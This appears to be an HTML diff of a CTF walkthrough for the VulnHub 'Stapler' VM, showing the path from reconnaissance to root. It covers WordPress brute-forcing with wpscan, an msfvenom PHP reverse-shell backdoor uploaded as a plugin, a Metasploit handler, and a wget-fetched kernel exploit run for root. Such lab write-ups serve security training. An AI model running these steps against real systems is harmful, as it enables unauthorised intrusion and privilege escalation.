@@ -1,0 +1,105 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Stapler VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-stapler-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-08-31T14:52:24+00:00">August 31, 2016</time><time class="updated" datetime="2025-06-10T20:30:41+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we will try to attack and gain root access to the Stapler: 1 challenge from VulnHub. The goal is to reconnaissance, enumeration, and exploits this vulnerable machine to get root access and to read the contents of flag.txt. We have been told that are various methods to do so but we have tried and found the simplest way.</span></p>
+<p><span style="color: #000000;">Download the stapler VM from<strong> </strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/stapler-1,150/"><strong>here</strong></a></span></span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
+<li><span style="color: #000000;">Enumeration (robot.txt)</span></li>
+<li><span style="color: #000000;">WordPress scanning &amp; password cracking (wpscan)</span></li>
+<li><span style="color: #000000;">Login into WordPress</span></li>
+<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
+<li><span style="color: #000000;">Upload and execute a backdoor</span></li>
+<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
+<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
+<li><span style="color: #000000;">Kernel privilege escalation</span></li>
+<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
+</ul>
+<p><span style="color: #000000;">Start off with scanning the network to find our target. And we all the command for it is:</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;">We found our target –&gt; 192.168.1.126</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dehREJwYRFQ/Wu6LHvgWbeI/AAAAAAAAWtE/hdVSlMcigHA1kEUGiDY7z-z9uM1404FgQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">To scan our target IP we will use aggressive scan (-A)</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.126</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-99gARP7hmrk/Wu6LIcmJh4I/AAAAAAAAWtQ/BlpBViFMB_gDAx-mYNWuR9k7LN3Z388rQCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">The result will show us that port number 21, 22, 53, 80, 137, 139, and so many other ports are open.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-qWxOjAz2pDU/Wu6LKAt5n5I/AAAAAAAAWtw/o-HaSbtR2nAWDe0leNN7m1Wx_uAP9E0kgCLcBGAs/s1600/3.1.png"/></span></p>
+<p><span style="color: #000000;">Also tell us about <strong>robot.txt</strong> 2 disallowed entries i.e. <strong>/admin112233 and /blogblog</strong>. Then we explored target IP over port 80 but didn’t found anything here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SoYXgTlCHS8/Wu6LKeRn1tI/AAAAAAAAWt0/Jv4NX8CAoIwUSo1rOw14HRAGAZYYqaYqACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">So we tried opening it in the browser with port 12380</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-5nVzzF9QvHg/Wu6LKj8GAvI/AAAAAAAAWt4/fGkqE975uMImId1i6fKf-nPQz3D-dFfWACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">We open <strong>/blogblog/ </strong>but here also didn’t find any clue for the next step.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hh-Wqqr_6e0/Wu6LK8y4c3I/AAAAAAAAWt8/pAid0IwLAeIM2TiY4JujHUAeewNCCBKKQCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Then we thought to explore <strong>https://192.168.1.126:12380/blogblog/</strong> which put up a new web page as shown below. Studying this blog we have established that the blog is made of Word Press. Now obviously use WPScan to know all about the blog. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-WsqmFFic6xc/Wu6LKyNPGVI/AAAAAAAAWuA/qRWo4sKObcM1IoM-4aLiZrKPbtLsq-m9gCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">To apply wpscan we have come up with a 3-in-1 command as it will tell us all about the theme and plug-ins as well as usernames and the command is:</span></p>
+<pre class="lang:default decode:true ">wpscan -u https://192.168.1.126/blogblog/ --enumerate at --enumerate ap --enumerate u --disable-tls-checks
+</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-P20lmEmzTzA/Wu6LLHVJtgI/AAAAAAAAWuE/6MiTPTBZ3KYkloTKyenSpq_CwTavgf8WwCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">It has dumped all username for login, now we only need a password for login into WordPress.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-_rQUtIdfrP0/Wu6LLSQTRvI/AAAAAAAAWuI/NMi0xujFad0oboABqLEvLrmL-qsm54IsQCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">By executing below command you will get a password for John.</span></p>
+<pre class="lang:default decode:true">wpscan -u https://192.168.1.126/blogblog/ --username John --wordlist /usr/share/wordlists/rockyou.txt
+</pre>
+<p><span style="color: #000000;">As you can see the password is “incorrect” for user “john”; now use these credential for login into WordPress.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-jNwc8Xh9UEg/Wu6LLTlA63I/AAAAAAAAWuM/dXft0OZJU1IJpN4gydSESqWXXH49DqqWACLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">As we logged in, all now we have to do is to create our PHP code to upload so that once the code will execute we will have its session. To generate the code type:</span></p>
+<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost-192.168.1.132 lport=4444 -f raw
+</pre>
+<p><span style="color: #000000;">On the other hand run multi/handler inside Metasploit framework.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-2TqcDAQXLws/Wu6LH_ExyGI/AAAAAAAAWtI/GLUDERmQH80PWHvczLInv-VwmZqyw5gogCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Copy the code from <strong>&lt;?php</strong> to <strong>die() </strong>and save it in a file with .php extension.</span></p>
+<p><span style="color: #000000;">Now, as we already logged on, go to <strong>plugins</strong> option then select <strong>add plugin</strong> option. Click on browse option and select the PHP in which you have just saved the code and click on OK.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-wrGfi7VqvqM/Wu6LH7Hl1KI/AAAAAAAAWtM/bWQWff_Osxst9s70Ppr3tWplAo5kyx-pQCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Now go to the upload directory and double click on the shell.php which you just uploaded.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QdVkHpYfvGY/Wu6LIuurY1I/AAAAAAAAWtU/ikS5PGnWYP8VWAak8xkdodH1m5Z8QgfugCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
+<pre class="lang:default decode:true">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.132
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;">From given below image you can observe <strong>Meterpreter session 1</strong>. But the task is not finished yet, still, we need to penetrate more for privilege escalation. Further type:</span></p>
+<p><span style="color: #000000;"><strong>sysinfo</strong></span></p>
+<p><span style="color: #000000;">Then to access proper TTY shell we had import python one line script by typing following:</span></p>
+<pre class="lang:default decode:true">shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+lsb_release -a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D0s2PqggFls/Wu6LI6gAeJI/AAAAAAAAWtY/LVHq4w-D4eUvsdyvDxwTtPumHRvytFk_ACLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">We now know that our target is using <strong>Ubuntu 16.04</strong> so we will try and search its exploit on <strong>exploit-db.com.</strong> Our search is successful and we have found our appropriate exploit as shown below:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4ZSUHklfL08/Wu6LJOd3rlI/AAAAAAAAWtc/_dpJumQ8kRoeBUg01XLEAQmQ6U4rpFoBACLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Now, we need to go into the desired writable file and for that type:</span></p>
+<pre class="lang:default decode:true">cd /tmp</pre>
+<p><span style="color: #000000;">And then to download the exploit type:</span></p>
+<pre class="lang:default decode:true">wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-K2zInupIcc8/Wu6LJQBrzcI/AAAAAAAAWtg/c1fkF6XT9OU8eZWQG11MhG0QIh8wI1YPgCLcBGAs/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">When we download the exploit, zip files are downloaded and now unzip it and for that type:</span></p>
+<pre class="lang:default decode:true">unzip 39772.zip</pre>
+<p><span style="color: #000000;">Open the unzipped file by typing:</span></p>
+<pre class="lang:default decode:true">ls
+cd 39772</pre>
+<p><span style="color: #000000;">Now we have a tar file named exploit.tar. Open it with the following command:</span></p>
+<pre class="lang:default decode:true">tar -xvf exploit.tar</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-aUJw4WoyobI/Wu6LJuIa8zI/AAAAAAAAWtk/AYA0hVoaXSIOL3BPmV-1DAX1vOQ5IMbJgCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">Now use the <strong>ls</strong> command to view the directories. Now we will go into the double put-exploit folder and for that type:</span></p>
+<pre class="lang:default decode:true ">cd ebpf_mapfd_doubleput_exploit
+ls 
+./compile.sh (will run the compile.sh)
+./doubleput (will run the double.sh)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-61ccyS73qgQ/Wu6LJyjcm1I/AAAAAAAAWto/s-59R8zmsdQ_hJYpKz0I6vCNZScO4J90QCLcBGAs/s1600/25.png"/></span></p>
+<pre class="lang:default decode:true">cd /root
+ls
+cat flag.txt</pre>
+<p><span style="color: #000000;"><strong>Note:</strong> This lab can be solved in multiple ways because there is more than one method to hack this lab.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DOqzOAYixL0/Wu6LKPUCEXI/AAAAAAAAWts/VTP-gyx4_HYuF3E5CARJt3uV4-cOEZHhgCLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
